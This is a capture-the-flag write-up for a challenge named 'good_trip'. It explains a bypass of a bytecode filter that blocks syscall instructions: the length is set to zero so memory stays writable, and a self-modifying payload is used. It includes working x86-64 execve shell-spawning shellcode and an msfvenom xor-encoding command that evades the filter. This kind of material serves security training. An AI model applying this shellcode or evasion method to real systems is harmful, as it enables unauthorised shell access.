## good_trip

- The binary first accepts a number (n), then it accepts bytecode

- It changes the memory which we entered to be non-writable, but it only changes the first n bytes

- It then ensures that our bytecode has no bytes corresponding to `syscall`, `sysenter` or `int 0x80`

- Simply lie that n = 0 so our bytecode remains writable, and make a self-modifying payload that gives us shell.

I used the following assembly:

```
    mov rsp, 0x1337131800	
    xor 	rsi,	rsi			
    push	rsi				
    mov 	rdi,	0x68732f2f6e69622f	 
    push	rdi
    push	rsp		
    pop	rdi				
    mov 	rax, 59
    xor rdx, rdx					
    syscall
```
- I first converted the assembly to bytecode using the assembler at https://defuse.ca/online-x86-assembler.htm#disassembly2

- I then saved the bytecode into `shellcode.bin` with the help of `shellcode.py`

- I then encoded it with the msfvenom x64/xor encoder: `./msfvenom -a x64 --platform linux -e x64/xor -f c < shellcode.bin`

- Use `solve.py` to send `b'0'` responding to the number of bytes, then send the encoded payload.